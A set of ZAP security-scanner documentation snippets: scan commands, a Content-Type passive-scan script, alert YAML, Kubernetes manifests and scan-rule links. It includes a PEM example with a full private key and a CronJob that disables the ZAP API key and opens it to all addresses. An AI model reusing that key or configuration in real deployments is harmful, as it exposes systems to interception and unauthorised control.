DESCRIPTION: Basic commands to pull the ZAP Docker image and run an API scan against an OpenAPI specification.

LANGUAGE: bash
CODE:
docker pull owasp/zap2docker-weekly
docker run -t owasp/zap2docker-weekly zap-api-scan.py -t \
    https://www.example.com/openapi.json -f openapi

----------------------------------------

TITLE: Path Traversal Attack Detection Implementation in Java
DESCRIPTION: Java implementation for detecting Path Traversal vulnerabilities in web applications. Located in the ZAP security testing framework's active scan rules module. The code performs automated testing for various path traversal attack vectors.

LANGUAGE: java
CODE:
org/zaproxy/zap/extension/ascanrules/PathTraversalScanRule.java

----------------------------------------

TITLE: Passive ZAP Script for Checking Content-Type Header (ASVS 14.4.1)
DESCRIPTION: This Python script for ZAP passively scans HTTP responses to verify that they contain a Content-Type header with a safe character set as required by ASVS control 14.4.1. It checks for the presence of the header and validates the charset for text/*, /+xml and application/xml content types.

LANGUAGE: Python
CODE:
import re

def scan(ps, msg, src):

  alertTitle = "14.4.1 Verify that every HTTP response contains a content type header specifying a safe character set (e.g., UTF-8, ISO 8859-1)."
  alertDescription = "The header Content-Type denotes what the content is encoded in. Declaring it hinders XSS attacks leveraging different encodings than the server expects."
  alertRisk = 0
  alertReliability = 1
  header = str(msg.getResponseHeader().getHeader("Content-Type"))
  alertSolution = ["Ensure that Content-Type is included in the response.","Ensure that Content-Type header with text/*, /+xml and application/xml content types specifies a safe character set (e.g., UTF-8, ISO-8859-1)."]
  alertParam = "Content-Type header"
  alertInfo = "Control failure"
  cweID = 173
  wascID = 0

  patternType = re.compile(r"text/.*|.*\+xml.*|application/xml.*")
  patternCharset = re.compile(r"(?i).*UTF-8.*|.*ISO-8859-1.*")

  if (header == "None"):
    ps.raiseAlert(alertRisk, alertReliability, alertTitle, alertDescription, 
      msg.getRequestHeader().getURI().toString(), 
      alertParam, "", alertInfo, alertSolution[0], header, cweID, wascID, msg);
  elif (re.search(patternType,header)):
    charsets = re.search(patternCharset,header)
    if not charsets:
      ps.raiseAlert(alertRisk, alertReliability, alertTitle, alertDescription, 
        msg.getRequestHeader().getURI().toString(), 
        alertParam, "", alertInfo, alertSolution[1], header, cweID, wascID, msg);

----------------------------------------

TITLE: Full Example of ZAP Sites Tree in YAML Format
DESCRIPTION: This example demonstrates a complete Sites Tree structure in YAML format. It includes multiple levels of nodes, showcasing various HTTP methods, status codes, and data parameters.

LANGUAGE: yaml
CODE:
- node: Sites
  children:
  - node: https://www.example.com
    url: https://www.example.com
    method: GET
    children:
    - node: missing
      url: https://www.example.com/missing
      method: GET
      responseLength: 1221
      statusCode: 404
    - node: path
      url: https://www.example.com/path
      method: GET
      responseLength: 1234
      statusCode: 200
      children:
      - node: GET:query(q)
        url: https://www.example.com/seq/query?q=search
        method: GET
        responseLength: 2345
        statusCode: 200
      - node: submit
        url: https://www.example.com/seq/submit()(field1,field2,field3)
        method: POST
        data: field1=&field2=&field3=
        responseLength: 3456
        statusCode: 200

----------------------------------------

TITLE: Scanning for Sensitive Information in Browser Storage (Java)
DESCRIPTION: This code snippet is part of a ZAP extension that scans for sensitive information stored in browser sessionStorage. It implements a client-side passive scan rule to detect potential security vulnerabilities.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/client/src/main/java/org/zaproxy/addon/client/pscan/SensitiveInfoInStorageScanRule.java

----------------------------------------

TITLE: Configuration Property Reference
DESCRIPTION: Reference to configuration property names and values used in ZAP settings.

LANGUAGE: markdown
CODE:
\`config.xml\` \`scanner.antiCSFR\` \`scanner.antiCSRF\`

----------------------------------------

TITLE: Same Node URL Examples
DESCRIPTION: Examples of URLs that ZAP will group into the same node despite having different parameter values.

LANGUAGE: plaintext
CODE:
GET https://www.example.com?a=b&c=d
GET https://www.example.com?a=c&c=c
GET https://www.example.com?a=e&c=f

----------------------------------------

TITLE: API Response Example - Context List
DESCRIPTION: Example showing the new JSON response format for the contextList API endpoint which now properly separates context names.

LANGUAGE: json
CODE:
{"contextList":["Context 1","Context 2"]}

----------------------------------------

TITLE: Configuring YAML Front Matter for ZAP Social Media Page
DESCRIPTION: YAML configuration block defining the page metadata and link structure for the ZAP social media contribution page. Includes page title, type, layout, and a structured list of social media links with descriptions.

LANGUAGE: yaml
CODE:
---
title: "Contribute: Social Media"
type: page
layout: links
links:
  - name: 'GitHub: zaproxy'
    link: https://github.com/zaproxy/zaproxy/
    desc: star the core ZAP project on GitHub

  - name: 'GitHub: zap-extensions'
    link: https://github.com/zaproxy/zap-extensions/
    desc: star the ZAP extensions on GitHub

  - name: 'Twitter: @zaproxy'
    link: https://twitter.com/zaproxy
    desc: follow the official ZAP Twitter account (low volume)

  - name: 'Docker: ZAP Stable'
    link: https://hub.docker.com/r/zaproxy/zap-stable/
    desc: like the ZAP stable Docker image

  - name: 'Docker: ZAP Weekly'
    link: https://hub.docker.com/r/zaproxy/zap-weekly/
    desc: like the ZAP weekly Docker image
    
  - name: 'OpenHub: zaproxy'
    link: https://www.openhub.net/p/zaproxy/
    desc: tell everyone that "I Use This!"

cascade:
  EditableContent: true
  addBreadcrumbs: true
---

----------------------------------------

TITLE: Detecting Insecure JSF ViewState in Java
DESCRIPTION: This code snippet demonstrates how to identify an insecure JSF ViewState input field in HTML. It shows the format of the vulnerable hidden input field containing the ViewState value.

LANGUAGE: html
CODE:
<input type="hidden" id="javax.faces.viewstate" value="1231">

----------------------------------------

TITLE: ZAP Resources Configuration
DESCRIPTION: Kubernetes configurations for ZAP including PVC, CronJob and Service definitions

LANGUAGE: yaml
CODE:
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  labels:
    app.kubernetes.io/name: zap
  name: zap-pvc
  namespace: zap-demo
spec:
  accessModes:
  - ReadWriteOnce
  resources:
    requests:
      storage: 50Mi
  storageClassName: dynamic-slrs-blob-fuse

LANGUAGE: yaml
CODE:
apiVersion: batch/v1
kind: CronJob
metadata:
  name: zap
  namespace: zap-demo
spec:
  schedule: "* * * * *"
  suspend: true
  jobTemplate:
    spec:
      backoffLimit: 0
      template:
        metadata:
          labels:
            app.kubernetes.io/name: zap
        spec:
          containers:
          - args:
            - ./zap.sh
            - -cmd
            - -autorun
            - /zap/config/af-plan.yaml
            - -host
            - 0.0.0.0
            - -config
            - api.disablekey=true
            - -config
            - api.addrs.addr.name=.*
            - -config
            - api.addrs.addr.regex=true
            image: ghcr.io/zaproxy/zaproxy:stable
            name: zaproxy
            ports:
            - containerPort: 8080
              name: zaproxy
              protocol: TCP
            startupProbe:
              failureThreshold: 3
              httpGet:
                path: /
                port: 8080
                scheme: HTTP
              initialDelaySeconds: 60
              periodSeconds: 10
              successThreshold: 1
              timeoutSeconds: 3
            volumeMounts:
            - mountPath: /zap/config
              name: config
            - mountPath: /zap/reports
              name: pvc
          restartPolicy: Never
          volumes:
          - name: config
            configMap:
              name: zap-config
          - name: pvc
            persistentVolumeClaim:
              claimName: zap-pvc

----------------------------------------

TITLE: ZAP Add-on Installation Paths
DESCRIPTION: Specifies the required directory locations where ZAP add-ons must be placed to be recognized by the application. Add-ons can be installed either in the main ZAP installation folder or the user's personal ZAP folder.

LANGUAGE: markdown
CODE:
* `plugin` directory located in the ZAP's installation folder;
* `plugin` directory located in the ZAP's user folder.

----------------------------------------

TITLE: Adding Neonmarker Color Mapping in ZAP using JavaScript
DESCRIPTION: This code snippet demonstrates how to add a color mapping to the Neonmarker extension in ZAP using JavaScript in a Stand Alone script. It sets up a mapping to color History items tagged 'Comment' in red.

LANGUAGE: javascript
CODE:
extNeon = control.getExtensionLoader().getExtension(org.zaproxy.zap.extension.neonmarker.ExtensionNeonmarker.NAME);

// History items tagged "Comment" will be red
extNeon.addColorMapping("Comment", 0x990000);

----------------------------------------

TITLE: YAML Alert Configuration for CORS Security Scanning
DESCRIPTION: Defines the structure and metadata for CORS-related security alerts in ZAP proxy. Includes alert IDs, names, and references to implementation code.

LANGUAGE: yaml
CODE:
title: "CORS Header"
alertid: 40040
alertindex: 4004000
alerttype: "Active"
status: beta
type: alertset
alerts:
   40040-1:
      alertid: 40040-1
      name: "CORS Header"
   40040-2:
      alertid: 40040-2
      name: "CORS Misconfiguration"
   40040-3:
      alertid: 40040-3
      name: "CORS Misconfiguration"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/CorsScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrulesBeta/CorsScanRule.java"

----------------------------------------

TITLE: Defining Node Structure in YAML for ZAP Sites Tree
DESCRIPTION: This snippet outlines the structure of a node in the ZAP Sites Tree YAML format. It includes properties such as node name, URL, HTTP method, response length, status code, data parameters, and children nodes.

LANGUAGE: yaml
CODE:
  - node:              # The name of the node, as shown in the ZAP Sites Tree
    url:               # The URL it represents, present for all apart from the top node
    method:            # The HTTP method, present for all apart from the top node
    responseLength:    # The length of the response, where relevant
    statusCode:        # The HTTP status code, where relevant
    data:              # The names of the data parameters, if any, separated with '=&'s
    children:          # A list of child nodes, present for all nodes apart from the leaves

----------------------------------------

TITLE: Scanning for JWT in Browser Storage using Java
DESCRIPTION: Java code for scanning and detecting JWT stored in browser sessionStorage. This rule is part of the ZAP (Zed Attack Proxy) client-side integration add-on.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/client/src/main/java/org/zaproxy/addon/client/pscan/JwtInStorageScanRule.java

----------------------------------------

TITLE: Setting ZAP API Key via Command Line
DESCRIPTION: This command-line option allows setting the ZAP API key, which is now required by default for API access. The API key can be customized to ensure secure API usage.

LANGUAGE: bash
CODE:
-config api.key=change-me-9203935709

----------------------------------------

TITLE: Markdown Documentation Table
DESCRIPTION: Markdown table showing related documentation links for ZAP UI Overview and Features

LANGUAGE: markdown
CODE:
|   |                                           |                                       |
|---|-------------------------------------------|---------------------------------------|
|   | [UI Overview](/docs/desktop/ui/)          | for an overview of the user interface |
|   | [Features](/docs/desktop/start/features/) | provided by ZAP                       |

----------------------------------------

TITLE: Implementing Sub Resource Integrity Attribute Scan Rule in Java for ZAP
DESCRIPTION: This code snippet implements a passive scan rule in ZAP to detect missing integrity attributes on script or link tags served by external servers. It calculates a SHA-384 hash for the script content and suggests adding a valid integrity attribute to prevent potential malicious content injection.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesBeta/src/main/java/org/zaproxy/zap/extension/pscanrulesBeta/SubResourceIntegrityAttributeScanRule.java

----------------------------------------

TITLE: Network Add-on Command Line Parameters
DESCRIPTION: Command line options supported by the Network add-on including certificate management and proxy configuration settings. These options allow users to load/dump certificates and override proxy host/port settings.

LANGUAGE: markdown
CODE:
| | |
|-|-|
| -certload | Loads the Root CA certificate from the specified file |
| -certpubdump | Dumps the Root CA certificate into the specified file, suitable for importing into browsers |
| -certfulldump | Dumps the Root CA certificate and private key into the specified file, suitable for importing into ZAP |
| -host | Overrides the host of the main proxy, specified in the configuration file |
| -port | Overrides the port of the main proxy, specified in the configuration file |

----------------------------------------

TITLE: ZAP Command Line Configuration
DESCRIPTION: Shows how to specify an alert override configuration file using ZAP's command line interface.

LANGUAGE: shell
CODE:
-config alert.overridesFilename=<filename>

----------------------------------------

TITLE: Alert Definition for Multiple HREFs in Redirect Response
DESCRIPTION: YAML frontmatter defining the security alert properties including risk level, solution guidance, and associated security standards like CWE and WASC. The alert checks for redirects that contain multiple HREF links which could expose sensitive information.

LANGUAGE: yaml
CODE:
title: "Multiple HREFs Redirect Detected (Potential Sensitive Information Leak)"
alertid: 10044-2
alertindex: 1004402
alerttype: "Passive"
alertcount: 2
status: release
type: alert
risk: Low
solution: "Ensure that no sensitive information is leaked via redirect responses. Redirect responses should have almost no content."
other: "The response contained 3 occurrences of \"HREF\"."
cwe: 201
wasc: 13
alerttags: 
  - CWE-201
  - OWASP_2017_A03
  - OWASP_2021_A04
  - WSTG-v42-INFO-05

----------------------------------------

TITLE: Implementing Sec-Fetch-Mode Header Check in Java for ZAP
DESCRIPTION: This code snippet is part of a ZAP extension that implements a passive scan rule to detect missing Sec-Fetch-Mode headers in HTTP requests. It helps identify potential security risks related to Cross-Site Request Forgery (CSRF) and resource loading differentiation.

LANGUAGE: java
CODE:
// Code reference:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesAlpha/src/main/java/org/zaproxy/zap/extension/pscanrulesAlpha/FetchMetadataRequestHeadersScanRule.java

----------------------------------------

TITLE: Defining gRPC Variant Documentation Structure in Markdown
DESCRIPTION: This markdown snippet defines the structure and content of the gRPC Variant documentation page. It includes the title, type, and weight of the page, as well as sections describing the gRPC Variant's functionality and related resources.

LANGUAGE: markdown
CODE:
---
# This page was generated from the add-on.
title: gRPC Variant
type: userguide
weight: 1
---

# gRPC Variant

The gRPC variant allow injecting payloads in gRPC values (Active Scan Input Vector support).

## Active Scan Input Vectors

Custom Values are injected into all key-value pairs in all gRPC values that are proxied through ZAP.

## See also

|   |                                                                |                                                   |
|---|----------------------------------------------------------------|---------------------------------------------------|
|   | [gRPC](/docs/desktop/addons/grpc-support/)                     | for an overview of the gRPC add-on.               |
|   | [gRPC WebSocket](/docs/desktop/addons/grpc-support/websocket/) | for information about the gRPC WebSocket Support. |

----------------------------------------

TITLE: Certificate PEM Format Example
DESCRIPTION: Example showing the PEM format structure for certificates containing both the certificate and private key sections.

LANGUAGE: text
CODE:
-----BEGIN CERTIFICATE-----
MIIC9TCCAl6gAwIBAgIJANL8E4epRNznMA0GCSqGSIb3DQEBBQUAMFsxGDAWBgNV
BAoTD1N1cGVyZmlzaCwgSW5jLjELMAkGA1UEBxMCU0YxCzAJBgNVBAgTAkNBMQsw
CQYDVQQGEwJVUzEYMBYGA1UEAxMPU3VwZXJmaXNoLCBJbmMuMB4XDTE0MDUxMjE2
MjUyNloXDTM0MDUwNzE2MjUyNlowWzEYMBYGA1UEChMPU3VwZXJmaXNoLCBJbmMu
MQswCQYDVQQHEwJTRjELMAkGA1UECBMCQ0ExCzAJBgNVBAYTAlVTMRgwFgYDVQQD
Ew9TdXBlcmZpc2gsIEluYy4wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAOjz
Shh2Xxk/sc9Y6X9DBwmVgDXFD/5xMSeBmRImIKXfj2r8QlU57gk4idngNsSsAYJb
1Tnm+Y8HiN/+7vahFM6pdEXY/fAXVyqC4XouEpNarIrXFWPRt5tVgA9YvBxJ7SBi
3bZMpTrrHD2g/3pxptMQeDOuS8Ic/ZJKocPnQaQtAgMBAAGjgcAwgb0wDAYDVR0T
BAUwAwEB/zAdBgNVHQ4EFgQU+5izU38URC7o7tUJml4OVoaoNYgwgY0GA1UdIwSB
hTCBgoAU+5izU38URC7o7tUJml4OVoaoNYihX6RdMFsxGDAWBgNVBAoTD1N1cGVy
ZmlzaCwgSW5jLjELMAkGA1UEBxMCU0YxCzAJBgNVBAgTAkNBMQswCQYDVQQGEwJV
UzEYMBYGA1UEAxMPU3VwZXJmaXNoLCBJbmMuggkA0vwTh6lE3OcwDQYJKoZIhvcN
AQEFBQADgYEApHyg7ApKx3DEcWjzOyLi3JyN0JL+c35yK1VEmxu0Qusfr76645Oj
1IsYwpTws6a9ZTRMzST4GQvFFQra81eLqYbPbMPuhC+FCxkUF5i0DNSWi+kczJXJ
TtCqSwGl9t9JEoFqvtW+znZ9TqyLiOMw7TGEUI+88VAqW0qmXnwPcfo=
-----END CERTIFICATE-----
-----BEGIN PRIVATE KEY-----
MIICXgIBAAKBgQDo80oYdl8ZP7HPWOl/QwcJlYA1xQ/+cTEngZkSJiCl349q/EJV
Oe4JOInZ4DbErAGCW9U55vmPB4jf/u72oRTOqXRF2P3wF1cqguF6LhKTWqyK1xVj
0bebVYAPWLwcSe0gYt22TKU66xw9oP96cabTEHgzrkvCHP2SSqHD50GkLQIDAQAB
AoGBAKepW14J7F5e0ppa8wvOcUU7neCVafKHA4rcoxBF8t+P7UhiMVfn7uQiFk2D
K8gXyKpLcEdRb7K7CI+3i8RkoXTRDEZU5XPMJnZsE5LWgNQ+pi3HwMEdR0vD2Iyv
vIH3tq6mNKgDu+vozm8DWsEP96jrhVbo1U1rzyEtX46afo79AkEA/VXanGaqj4ua
EsqfY6n/7+MTm4iPOM7qfoyI4EppJXZklc/FbcV2lAjY2Jl9U6X7WnqCPn+/zg44
6lKWTnhAawJBAOtmi6nw8WjY6uyXZosE/0r4SkSSo20EJbBCJcgdofKT+VCGB4hp
h6XwGdls0ca+qa5ZE1a196dpwwVre0hm88cCQQDrUm3QbHmw/39uRzOJs6dfYPKc
vlwz69jdFpQqrFRBjVlf4/FDx3IfjpxHj0RgiEUUxcnoXmh/8qwh1fdzCrbjAkB4
afg/chTLQUrKw5ecvW2p9+Blu20Fsv1kcDHLb/0LjU4XNrhbuz+8TlmqstOMCrPZ
j48o5+RLKvqrpxNlMeS5AkEA6qIdW/yp5N8b1j2OxYZ9u5O//BvspwRITGM60Cps
yemZE/ua8wm34SKvDHf5uxcmofShW17PLICrsLJ7P35y/A==
-----END PRIVATE KEY-----

----------------------------------------

TITLE: Implementing Heartbleed Vulnerability Detection in Java for ZAP
DESCRIPTION: This code snippet is part of a ZAP extension that implements an active scan rule to detect the Heartbleed OpenSSL vulnerability. It likely includes methods for crafting and sending specially formatted TLS packets to test for the vulnerability.

LANGUAGE: java
CODE:
// Code not provided in the input text, but referenced at:
// https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/HeartBleedActiveScanRule.java

----------------------------------------

TITLE: Latest Video Shortcode Integration
DESCRIPTION: Markdown shortcode for embedding the latest ZAP video using YouTube integration.

LANGUAGE: markdown
CODE:
### Latest Video
{{<youtube-latest>}}

----------------------------------------

TITLE: Setting and Getting Script Variables in JavaScript
DESCRIPTION: Examples of how to set and get script-specific variables that persist between invocations of the same script.

LANGUAGE: javascript
CODE:
org.zaproxy.zap.extension.script.ScriptVars.setScriptVar(this.context, "var.name","value")
org.zaproxy.zap.extension.script.ScriptVars.getScriptVar(this.context, "var.name")

----------------------------------------

TITLE: Uploading File to ZAP API using cURL
DESCRIPTION: This snippet demonstrates how to upload a file to the ZAP API using cURL. It specifies the file contents, API key, and destination filename as form data in a POST request.

LANGUAGE: bash
CODE:
curl \
    -F fileContents=@/full/path/to/file/to/be/uploaded \
    -F apikey=your-api-key \
    -F fileName=destination-filename \
    http://localhost:8080/OTHER/core/other/fileUpload/

----------------------------------------

TITLE: Defining CRLF Injection Alert in YAML
DESCRIPTION: YAML configuration for the CRLF Injection vulnerability alert in ZAP. It includes metadata such as alert ID, risk level, solution, and associated tags for categorization and reference.

LANGUAGE: yaml
CODE:
title: "CRLF Injection"
alertid: 40003
alertindex: 4000300
alerttype: "Active"
alertcount: 1
status: release
type: alert
risk: Medium
solution: "Type check the submitted parameter carefully. Do not allow CRLF to be injected by filtering CRLF."
references:
   - https://owasp.org/www-community/vulnerabilities/CRLF_Injection
   - https://cwe.mitre.org/data/definitions/113.html
other: ""
cwe: 113
wasc: 25
alerttags: 
  - CWE-113
  - OWASP_2017_A01
  - OWASP_2021_A03
  - POLICY_API
  - POLICY_DEV_FULL
  - POLICY_QA_FULL
  - POLICY_SEQUENCE
  - WSTG-v42-INPV-15
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/CrlfInjectionScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrules/CrlfInjectionScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules/#id-40003

----------------------------------------

TITLE: Alert Definition for Invalid Sec-Fetch-Site Header Scanner
DESCRIPTION: YAML configuration defining the security alert raised when an invalid Sec-Fetch-Site header is detected. Includes alert ID, risk level, solution guidance, and references.

LANGUAGE: yaml
CODE:
title: "Sec-Fetch-Site Header Has an Invalid Value"
alertid: 90005-5
alertindex: 9000505
alerttype: "Passive"
alertcount: 8
status: alpha
type: alert
risk: Informational
solution: "Sec-Fetch-Site header must have one of the following values: same-origin, same-site, cross-origin, or none."
references:
   - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Site
other: ""
cwe: 352
wasc: 9
alerttags: 
  - CWE-352
  - WSTG-v42-SESS-05

----------------------------------------

TITLE: Decoding Base64 Encoded Protobuf Message
DESCRIPTION: Example of a base64 encoded protobuf message that demonstrates the binary format before decoding. This represents the raw format that ZAP receives from gRPC endpoints.

LANGUAGE: base64
CODE:
AAAAAIYJZCZMzMzcXkAVrseHQhi5YCDqrcDlJCixqAM1QEIPADOQSGVsbG8sIFByb3RvYnVmIUJMCgsxMjMgTWFpbiBTdBIGT X1DaXR5GgUxMjMONSIuCgtIZWxsbyBXb3JsZBIITXkgV29ybGQaCllvdXIgV29ybGQiCU91ciBXb3JsZEjqrcDLJA==

----------------------------------------

TITLE: Advanced JVM Configuration Example
DESCRIPTION: Example showing combined JVM options including initial heap size, maximum heap size, and pre-touch option for memory allocation.

LANGUAGE: shell
CODE:
-XX:+AlwaysPreTouch -Xms512m -Xmx512m

----------------------------------------

TITLE: YAML Frontmatter Configuration
DESCRIPTION: YAML configuration block defining metadata for the blog post including title, summary, images, type, tags, date and authors.

LANGUAGE: yaml
CODE:
---
title: "ZAP Development Focus Questionnaire Results"
summary: >
  The questionnaire results, and what we're doing about the things you care about most.
images:
- https://www.zaproxy.org/blog/2023-12-04-development-focus-results/images/questionnaire-results.png
type: post
tags:
- blog
- update
date: "2023-12-04"
authors:
- simon
---

----------------------------------------

TITLE: Defining YAML Frontmatter for FuzzDB Offensive Documentation
DESCRIPTION: YAML frontmatter defining metadata for the FuzzDB Offensive user guide page. It specifies the title, type, weight, and cascade information for the add-on ID and version.

LANGUAGE: yaml
CODE:
---
# This page was generated from the add-on.
title: FuzzDB Offensive
type: userguide
weight: 1
cascade:
  addon:
    id: fuzzdboffensive
    version: 5.0.0
---

----------------------------------------

TITLE: Passive Scanner API Views
DESCRIPTION: API views for monitoring passive scanning status including current tasks, alert thresholds, and scanning progress.

LANGUAGE: markdown
CODE:
### Views

* currentTasks: Shows information about the passive scan tasks currently being run (if any).
* maxAlertsPerRule: Gets the maximum number of alerts a passive scan rule should raise.
* recordsToScan: The number of records the passive scanner still has to scan.
* scanOnlyInScope: Tells whether or not the passive scan should be performed only on messages that are in scope.
* scanners: Lists all passive scan rules with their ID, name, enabled state, and alert threshold.

----------------------------------------

TITLE: Implementing Cross-Domain Security Scanner in Java
DESCRIPTION: Java implementation for scanning cross-domain misconfiguration vulnerabilities in web applications. The scanner checks for permissive crossdomain.xml configurations that could allow malicious cross-domain requests from Flash/Silverlight components.

LANGUAGE: java
CODE:
// Reference code at:
// https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/CrossDomainScanRule.java

----------------------------------------

TITLE: Configuring Twitter Redirection in YAML
DESCRIPTION: YAML front matter for configuring a page redirect to ZAP's Twitter account. It sets the title, layout type, and specifies the source and target URLs for the redirection.

LANGUAGE: yaml
CODE:
---
title: Twitter
layout: redirect
url: /twitter/
redirect: https://twitter.com/zaproxy
---

----------------------------------------

TITLE: Setting and Getting Global Variables in JavaScript
DESCRIPTION: Examples of how to set and get global variables that can be shared between all scripts using the ScriptVars class.

LANGUAGE: javascript
CODE:
org.zaproxy.zap.extension.script.ScriptVars.setGlobalVar("var.name","value")
org.zaproxy.zap.extension.script.ScriptVars.getGlobalVar("var.name")

----------------------------------------

TITLE: Implementing Sec-Fetch-User Header Validation in Java for ZAP
DESCRIPTION: This code snippet is part of a ZAP extension that implements a passive scan rule to check for invalid Sec-Fetch-User header values. It validates that the header value is set to '?1' as per the specification.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesAlpha/src/main/java/org/zaproxy/zap/extension/pscanrulesAlpha/FetchMetadataRequestHeadersScanRule.java

----------------------------------------

TITLE: YAML Frontmatter Configuration for Database Add-on Documentation
DESCRIPTION: YAML configuration block that defines metadata for the database add-on documentation page, including title, type, weight and add-on specific information like ID and version.

LANGUAGE: yaml
CODE:
# This page was generated from the add-on.
title: Database Add-on
type: userguide
weight: 1
cascade:
  addon:
    id: database
    version: 0.8.0

----------------------------------------

TITLE: Launching ZAP Process from Java
DESCRIPTION: Demonstrates how to programmatically start the OWASP ZAP application from Java code. The code shows launching ZAP with its UI for initial testing, with a note about using -daemon flag for background operation.

LANGUAGE: Java
CODE:
ProcessBuilder pb = new ProcessBuilder("/home/myuser/fullpath/ZAP 2.9.0/zap.sh");  // full path to script, use zap.bat on Windows
pb.directory(new File("/home/myuser/fullpath/ZAP 2.9.0/"));  // directory where the script is in
Process p = pb.start();

----------------------------------------

TITLE: Executing ZAP Full Scan with Docker (No File Parameters)
DESCRIPTION: Example command to run the ZAP full scan script using Docker without any file parameters. This performs a basic scan against the specified target URL.

LANGUAGE: bash
CODE:
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py -t https://www.example.com

----------------------------------------

TITLE: Alert Configuration in YAML
DESCRIPTION: YAML configuration for the padding oracle vulnerability alert, defining risk level, solutions, references, and associated security standards (CWE, WASC, OWASP).

LANGUAGE: yaml
CODE:
title: "Generic Padding Oracle"
alertid: 90024
alertindex: 9002400
alerttype: "Active"
alertcount: 1
status: release
type: alert
risk: High
solution: "Update the affected server software, or modify the scripts so that they properly validate encrypted data before attempting decryption."
references:
   - https://learn.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-070
   - https://www.mono-project.com/docs/about-mono/vulnerabilities/
   - https://bugzilla.redhat.com/show_bug.cgi?id=623799
other: ""
cwe: 209
wasc: 20
alerttags: 
  - CWE-209
  - OWASP_2017_A06
  - OWASP_2021_A02
  - POLICY_QA_FULL
  - WSTG-v42-CRYP-02
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/PaddingOracleScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrules/PaddingOracleScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules/#id-90024

----------------------------------------

TITLE: YAML Front Matter Configuration for Custom Payloads Documentation
DESCRIPTION: YAML configuration block defining metadata for the Custom Payloads documentation page, including title, type, weight and add-on details.

LANGUAGE: yaml
CODE:
title: Custom Payloads
type: userguide
weight: 1
cascade:
  addon:
    id: custompayloads
    version: 0.14.0

----------------------------------------

TITLE: Configuring ZAP Blog Settings in YAML
DESCRIPTION: This YAML snippet defines the configuration for the ZAP blog. It sets the title, cascading properties for child pages, and a specific setting for the current page. The cascade property ensures that child pages inherit certain attributes by default.

LANGUAGE: yaml
CODE:
---
title: "The ZAP Blog"
cascade:
   EditableContent: true
   addSocialPreview: true
EditableContent: false
---

----------------------------------------

TITLE: Markdown Documentation Structure
DESCRIPTION: Basic markdown structure defining the documentation page metadata and content for the All In One Notes ZAP extension.

LANGUAGE: markdown
CODE:
---
# This page was generated from the add-on.
title: All In One Notes - About
type: userguide
weight: 1
---

# All In One Notes - About

## Source Code

<https://github.com/zaproxy/zap-extensions/tree/main/addOns/allinonenotes>

## Authors

David Vassallo

## History

### Version 1

First Version

----------------------------------------

TITLE: Implementing External Redirect Scan Rule in Java for ZAP
DESCRIPTION: This code snippet represents the implementation of the External Redirect Scan Rule in Java for the OWASP ZAP project. It's located in the ExternalRedirectScanRule.java file within the org.zaproxy.zap.extension.ascanrules package.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/ExternalRedirectScanRule.java

----------------------------------------

TITLE: Configuring Slack Redirect in Jekyll/GitHub Pages
DESCRIPTION: YAML frontmatter configuration that sets up a redirect from a /slack/ URL path to the ZAP Slack workspace URL. Uses Jekyll's redirect layout to handle the forwarding.

LANGUAGE: yaml
CODE:
---
title: Slack
layout: redirect
url: /slack/
redirect: https://zaproxy.slack.com/
---

----------------------------------------

TITLE: InPageBannerInfoLeakScanRule - Server Banner Detection
DESCRIPTION: Analyzes error responses for web/application server banner information that could facilitate targeted attacks. Can also check 200 OK responses at Low threshold.



----------------------------------------

TITLE: Structural Parameter URL Examples
DESCRIPTION: Examples showing how action parameters can affect application structure and require special handling in ZAP.

LANGUAGE: http
CODE:
GET https://www.example.com?a=b&action=add
GET https://www.example.com?a=b&action=delete

----------------------------------------

TITLE: Describing Cookie Slack Detection Process in ZAP
DESCRIPTION: Explains the process of detecting cookie slack by making repeated GET requests, dropping different cookies each time, and comparing responses against the original baseline GET request. This method can reveal areas where cookie-based authentication or attributes are not properly enforced.

LANGUAGE: markdown
CODE:
Repeated GET requests: drop a different cookie each time, followed by normal request with all cookies to stabilize session, compare responses against original baseline GET. This can reveal areas where cookie based authentication/attributes are not actually enforced.

----------------------------------------

TITLE: YAML Configuration for ZAP Online Menu Add-on
DESCRIPTION: YAML frontmatter configuration that specifies metadata for the Online Menu documentation page, including title, type, weight and add-on details.

LANGUAGE: yaml
CODE:
title: Online Menu
type: userguide
weight: 1
cascade:
  addon:
    id: onlineMenu
    version: 14.0.0

----------------------------------------

TITLE: Inspecting Vaadin Login Button HTML Structure
DESCRIPTION: This HTML snippet shows the structure of a login button in a Vaadin application. It demonstrates how Vaadin uses div elements with specific classes and roles instead of traditional HTML button elements, which requires special configuration in ZAP for effective testing.

LANGUAGE: html
CODE:
<div class="v-button v-widget primary v-button-primary" role="button" tabindex="0">
<span class="v-button-wrap"><span class="v-button-caption">Sign In</span></span></div>

----------------------------------------

TITLE: Checking .DS_Store File in ZAP Spider
DESCRIPTION: This Java code snippet from ZAP Spider checks if a resource is a .DS_Store file and if it starts with the correct magic bytes.

LANGUAGE: java
CODE:
@Override
